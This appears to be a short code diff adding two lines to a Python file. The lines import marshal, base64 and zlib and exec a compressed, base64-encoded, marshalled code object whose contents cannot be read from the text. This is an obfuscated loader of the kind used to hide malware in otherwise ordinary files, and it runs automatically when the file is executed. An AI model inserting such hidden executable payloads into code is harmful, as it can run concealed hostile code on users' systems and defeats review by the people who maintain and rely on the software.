@@ -1,0 +1,2 @@
+import marshal, base64, zlib
+exec(marshal.loads(zlib.decompress(base64.b64decode('eNpdTzEOwjAMtN2UlhewIrZKPKGqkNi7sLGV2oKhpVIKEqBu8Bm+lJVfMJGEoVEj3cU6+e6SD0xOZLGx6FeWGBhfsAcmjuyNggKsnsjxk/bEsx1kSY2B281ksXUJqUvAARZg96h8JCdpmm69fEOGRp2rVrTb9/Sd50ctchFdmNhPTu3Jh2pluaagh6Y9Awzoe7D0eRkZrAwexgbtfmaiijkOkhMn4s3gvcwi3/OXZlr6a3MJ7GNGmrcdXxsp/BOdJ1Wp+gFrDTOK'))))
